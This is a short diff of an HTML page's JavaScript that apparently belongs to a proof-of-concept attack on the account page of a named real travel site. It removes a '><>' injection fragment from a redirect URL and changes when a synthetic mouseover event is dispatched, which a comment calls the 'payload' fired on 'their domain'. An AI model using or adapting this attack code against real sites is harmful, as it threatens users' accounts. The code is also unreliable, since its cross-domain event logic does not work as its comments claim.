@@ -10,11 +10,11 @@
     document.addEventListener("DOMContentLoaded", function() {
         document.getElementById("redirectLink").addEventListener("click", function() {
             // Redirect to the target URL
-            window.location.href = "http://travelpirates.hometogo.com/account/><>";
+            window.location.href = "http://travelpirates.hometogo.com/account/";
         });
         
-        // After a delay, simulate the hover event on their domain
-        setTimeout(function() {
+        // After the page loads on their domain, simulate the hover event with the payload
+        window.addEventListener("load", function() {
             var hoverEvent = new Event("mouseover");
             var link = document.getElementById("redirectLink");
             
@@ -23,7 +23,7 @@
             
             // Dispatch the hover event
             link.dispatchEvent(hoverEvent);
-        }, 5000);
+        });
     });
     </script>
 </body>
